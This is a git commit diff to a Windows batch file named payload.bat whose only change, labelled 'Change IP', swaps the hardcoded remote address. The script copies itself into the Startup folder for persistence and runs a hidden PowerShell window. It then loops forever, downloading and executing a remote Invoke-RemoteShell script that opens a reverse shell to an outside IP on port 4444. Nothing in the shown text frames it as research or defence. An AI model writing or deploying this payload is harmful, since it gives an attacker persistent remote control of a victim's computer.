f4877077e4f62bdc067c505a8d84b2264060d232
Lorenzo Leonardo <enzotechcomputersolutions@gmail.com>
2023-02-11 20:09:15 +0800

    Change IP

--- payload.bat
+++ payload.bat
@@ -2,6 +2,6 @@
 xcopy /s /Y "%0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 powershell -window hidden -command ""
 :start
-powershell IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.114.25.181 -RemotePort 4444 -Rows 24 -Cols 80
+powershell IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.230.96.131 -RemotePort 4444 -Rows 24 -Cols 80
 TIMEOUT /T 10
 goto start
